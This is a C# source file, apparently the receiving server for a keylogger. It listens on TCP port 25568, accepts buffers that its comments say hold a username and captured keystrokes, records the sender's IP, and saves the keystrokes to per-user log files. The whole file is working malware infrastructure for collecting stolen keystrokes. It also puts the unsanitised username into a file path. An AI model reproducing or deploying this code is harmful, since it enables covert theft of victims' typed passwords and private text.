using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace SK_Server
{
    internal class Server
    {
        // port to listen to
        private static int _PORT = 25568;

        static void Main(string[] args)
        {
            Directory.CreateDirectory("logs");

            TcpListener server = new TcpListener(IPAddress.Any, _PORT);
            server.Start();

            while (true)
            {
                TcpClient client = server.AcceptTcpClient();
                using (NetworkStream stream = client.GetStream())
                {
                    // read the incoming buffer from the client
                    byte[] buffer = new byte[1024]; // adjust the buffer size as needed
                    int bufferBytes = stream.Read(buffer, 0, buffer.Length);
                    string bufferString = Encoding.UTF8.GetString(buffer, 0, bufferBytes);

                    // split buffer by '¶', [0]: contains username, [1]: contains keystrokes
                    string[] bufferStringSplit = bufferString.Split('¶');
                    string username = bufferStringSplit[0];
                    string eventBufferContents = bufferStringSplit[1];

                    // get public ip
                    string connectedIP = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();

                    // get current date
                    DateTime date = DateTime.Now;

                    // format log
                    string log = "[" + date.ToString("M/d/yyyy h:mm:ss tt") + $"] Recieved content from: {connectedIP} - Username: {username}";

                    // print log
                    Console.WriteLine(log);
                    // write log
                    File.WriteAllText($"logs\\Server_" + date.ToString("yyyy.MM.dd-HH.mm.ss") + "_" + username + ".log", log + "\n\n" + eventBufferContents);
                }
                client.Close();
            }
        }
    }
}